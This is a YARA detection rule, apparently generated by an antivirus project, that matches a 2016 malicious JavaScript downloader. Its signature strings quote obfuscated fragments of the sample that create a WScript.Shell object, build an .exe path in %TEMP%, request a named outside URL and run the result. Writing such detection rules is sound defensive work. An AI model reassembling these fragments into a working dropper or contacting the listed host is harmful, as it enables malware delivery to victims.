rule sig_20160329_1bf64baefbe9b8c2eef9785c4715c8d0 {
  meta:
    description = "datamaliciousorder - file 20160329_1bf64baefbe9b8c2eef9785c4715c8d0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "da8ea7cf9f0162ede4995c97eef468d5ba4403e5a306723238decf92296a271c"

  strings:
    $s1  = "function Tprtrym() {return Qjxyifg[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hVxBmUl3q.exe\";};" fullword ascii
    $s2  = "Zqpbuhrlld[Theqsg](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Yopypz](Bncfovgbwo() * 11)} while (Zqpbuhrlld[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qjxyifg = function Mlvlcdythx() {return WScript[Duajt](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Aukrycbuhv(Vihlg, Zyauxsgtp){return Vihlg - Zyauxsgtp;};" fullword ascii
    $s6  = "function Njkyrmxmef() {return ((Lgdxzupxrg == true) && (Lgdxzupxrg == Feqgqjsip)) ? 1 : Vueunzzicy;};" fullword ascii
    $s7  = "function Qzvznwpug(Bdntesmrww){Qjxyifg[\"Run\"](Bdntesmrww, Vueunzzicy, Vueunzzicy);};" fullword ascii
    $s8  = "Feqgqjsip = true; " fullword ascii
    $s9  = "function Ftzzanfl(){return Duajt;};" fullword ascii
    $s10 = "function Bncfovgbwo(){return 22;};" fullword ascii
    $s11 = "var Jucrpmaj = false;" fullword ascii
    $s12 = "function Wflso()" fullword ascii
    $s13 = "return Aukrycbuhv(Dfuffmujs, Zerjta);" fullword ascii
    $s14 = "function Kwufoctwov(Lcscfqhxvb) {var Mcjsa = (1, 2, 3, 4, 5, Lcscfqhxvb); return Mcjsa;};" fullword ascii
    $s15 = "var Gblfmaqt = new this[\"Date\"]();" fullword ascii
    $s16 = "var Lgdxzupxrg = false;" fullword ascii
    $s17 = "var Feqgqjsip = false;" fullword ascii
    $s18 = "Lgdxzupxrg = true; " fullword ascii
    $s19 = " while (Jaonnmwt){" fullword ascii
    $s20 = "function Sxheoszixd(){return Nvnkzyalg;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}